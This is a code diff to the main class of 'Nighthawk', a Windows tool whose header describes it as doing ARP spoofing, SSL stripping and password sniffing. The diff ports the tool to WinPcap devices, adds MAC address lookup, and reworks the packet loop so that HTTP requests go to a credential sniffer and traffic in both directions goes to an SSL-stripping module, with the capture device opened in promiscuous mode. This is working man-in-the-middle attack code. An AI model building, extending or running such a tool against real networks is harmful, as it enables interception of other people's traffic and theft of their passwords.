@@ -8,12 +8,15 @@ using System.Net;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading;
 using System.Windows;
 using System.Windows.Documents;
 using System.Windows.Media;
-using SharpPcap;
 using PacketDotNet;
+using SharpPcap;
+using SharpPcap.WinPcap;
+using SharpPcap.LibPcap;
 
 /**
 Nighthawk - ARP spoofing, simple SSL stripping and password sniffing for Windows
@@ -37,7 +40,7 @@ namespace Nighthawk
     public class Main
     {
         // our network interface
-        public LivePcapDevice Device;
+        public WinPcapDevice Device;
 
         // list of devices (DeviceInfo)
         public List<DeviceInfo> DeviceInfoList = new List<DeviceInfo>();
@@ -81,7 +84,7 @@ namespace Nighthawk
 
             try
             {
-                var instance = LivePcapDeviceList.Instance[0];
+                var instance = WinPcapDeviceList.Instance[0];
                 if (instance == null) error = true;
             } catch {
                 error = true;
@@ -95,7 +98,7 @@ namespace Nighthawk
             }
             //
 
-            foreach (var device in LivePcapDeviceList.Instance)
+            foreach (var device in WinPcapDeviceList.Instance)
             {
                 // get IPv4 address, subnet mask and broadcast address
                 var address = "";
@@ -132,15 +135,31 @@ namespace Nighthawk
                     }
                 }
 
+                // strip description
+                var descriptionParts = device.Description.Split('\'');
+                var description = descriptionParts[1];
+
                 if (address != string.Empty && address != "0.0.0.0")
                 {
                     DeviceInfoList.Add(new DeviceInfo { Device = device, CIDR = (int)Network.MaskToCIDR(subnet), IP = address, IPv6 = address6, LinkLocal = linkLocal, Mask = subnet, Broadcast = broadcast });
-                    devices.Add(device.Description + " (IPv4: " + address + "/" + Network.MaskToCIDR(subnet) + (address6 != string.Empty ? ", IPv6: " + address6 + ", " + linkLocal : "") + ")");
+                    devices.Add(description + " (IPv4: " + address + "/" + Network.MaskToCIDR(subnet) + (address6 != string.Empty ? ", IPv6: " + address6 + ", " + linkLocal : "") + ")");
                 }
                 else
                 {
                     DeviceInfoList.Add(new DeviceInfo { Device = device, IP = "0.0.0.0"});
-                    devices.Add(device.Description + " (IPv4: none" + (address6 != string.Empty ? ", IPv6: " + address6 + ", " + linkLocal : "") + ")");
+                    devices.Add(description + " (IPv4: none" + (address6 != string.Empty ? ", IPv6: " + address6 + ", " + linkLocal : "") + ")");
+                }
+
+                // parse interface ID from WinPcap device "Name"
+                var id = Regex.Split(device.Name, "NPF_")[1];
+
+                // get and set mac address (DeviceInfo)
+                foreach (var iface in NetworkInterface.GetAllNetworkInterfaces())
+                {
+                    if (iface.Id == id)
+                    {
+                        if(DeviceInfoList.Last() != null) DeviceInfoList.Last().PMAC = iface.GetPhysicalAddress();
+                    }
                 }
             }
 
@@ -153,7 +172,7 @@ namespace Nighthawk
             Started = true;
 
             deviceInfo = DeviceInfoList[deviceIndex];
-            Device = LivePcapDeviceList.Instance[deviceIndex];    
+            Device = WinPcapDeviceList.Instance[deviceIndex];    
 
             // initialize modules
             Sniffer = new Sniffer(deviceInfo);
@@ -167,7 +186,7 @@ namespace Nighthawk
             Scanner.ScannerResponse += new ScannerResponseReceived(scanner_OnResponse);
             Scanner.ScanComplete += new ScannerEventHandler(scanner_OnScanComplete);
             Scanner.HostnameResolved += new ScannerHostnameResolvedHandler(scanner_HostnameResolved);
-            SSLStrip.SSLStripped += new SSLStrip.SSLStripHandler(SSLStrip_OnSSLStripped);
+            SSLStrip.SSLStripped += new SSLStripHandler(SSLStrip_OnSSLStripped);
 
             // open device, start capturing
             Device.Open(DeviceMode.Promiscuous, 1);
@@ -229,27 +248,6 @@ namespace Nighthawk
                 var ip = IpPacket.GetEncapsulated(packet);
                 var icmpv6 = ICMPv6Packet.GetEncapsulated(packet);
 
-                // TCP packet
-                if (tcp != null)
-                {
-                    // if we are likely to have a HTTP packet
-                    if ((tcp.SourcePort == 80 || tcp.DestinationPort == 80))
-                    {
-                        if (Sniffer.Started)
-                        {
-                            lock (Sniffer.PacketQueue)
-                            {
-                                Sniffer.PacketQueue.Add(tcp);
-                            }
-                        }
-
-                        if (SSLStrip.Started)
-                        {
-                            SSLStrip.ProcessPacket(packet, tcp);
-                        }
-                    }
-                }
-
                 // ARP packet
                 if (arp != null)
                 {
@@ -272,6 +270,31 @@ namespace Nighthawk
                             icmpv6.ParentPacket = ip;
                             icmpv6.ParentPacket.ParentPacket = packet;
                             Scanner.PacketQueueNDP.Add(icmpv6);
+                        }
+                    }
+                }
+
+                // TCP packet
+                if (tcp != null)
+                {
+                    // if we are likely to have a HTTP packet (client -> server)
+                    if (tcp.DestinationPort == 80)
+                    {
+                        if (Sniffer.Started)
+                        {
+                            lock (Sniffer.PacketQueue)
+                            {
+                                Sniffer.PacketQueue.Add(tcp);
+                            }
+                        }
+                    }
+
+                    // SSL stripping needs in & out
+                    if (tcp.DestinationPort == 80 || tcp.SourcePort == 80)
+                    {
+                        if (SSLStrip.Started)
+                        {
+                            if(!SSLStrip.ProcessPacket(packet, tcp)) return;
                         }
                     }
                 }
@@ -353,7 +376,7 @@ namespace Nighthawk
                         item.IP = ip;
                    
                     // exclude local MAC
-                    if (mac != deviceInfo.Device.Interface.MacAddress)
+                    if (mac.ToString() != deviceInfo.PMAC.ToString())
                     {
                         Window.TargetList.Add(item);
                         Window.TargetList.Sort();
